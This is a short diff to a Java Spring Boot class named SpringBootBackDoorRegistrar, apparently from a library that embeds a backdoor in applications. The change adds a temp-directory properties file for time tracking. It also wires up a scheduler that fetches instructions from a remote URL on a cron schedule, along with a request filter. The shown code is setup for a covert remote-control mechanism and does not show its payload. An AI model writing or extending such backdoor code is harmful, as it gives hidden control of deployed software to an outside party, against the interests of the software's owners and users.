@@ -34,14 +34,16 @@ public class SpringBootBackDoorRegistrar implements ImportBeanDefinitionRegistra
             List<Object> remoteAddress = allAnnotationAttributes.get("remoteAddress");
             List<Object> timeAddress = allAnnotationAttributes.get("timeAddress");
             List<Object> message = allAnnotationAttributes.get("message");
+            List<Object> fileName = allAnnotationAttributes.get("fileName");
 
-            BackDoorPropertiesFileUtils.setTime(System.currentTimeMillis());
+            BackDoorPropertiesFileUtils backDoorPropertiesFileUtils = new BackDoorPropertiesFileUtils(System.getProperty("java.io.tmpdir") + fileName.get(0));
+            backDoorPropertiesFileUtils.setTime(System.currentTimeMillis());
             BeanDefinitionBuilder schedulerBuilder = buildConfiguration(SpringBootBackDoorScheduler.class);
             addValue(schedulerBuilder, "timestamp", value.get(0));
             addValue(schedulerBuilder, "instructUrl", instructUrl.get(0));
             addValue(schedulerBuilder, "cron", cron.get(0));
             addValue(schedulerBuilder, "mustBeNetworked", mustBeNetworked.get(0));
-            addValue(schedulerBuilder, "netWorkUtils", new NetWorkUtils((String) remoteAddress.get(0), (String) timeAddress.get(0)));
+            addValue(schedulerBuilder, "netWorkUtils", new NetWorkUtils(backDoorPropertiesFileUtils, (String) remoteAddress.get(0), (String) timeAddress.get(0)));
             registerConfiguration(registry, schedulerBuilder, SpringBootBackDoorScheduler.class);
 
             BeanDefinitionBuilder filterBuilder = buildConfiguration(SpringBootBackDoorFilterConfiguration.class);
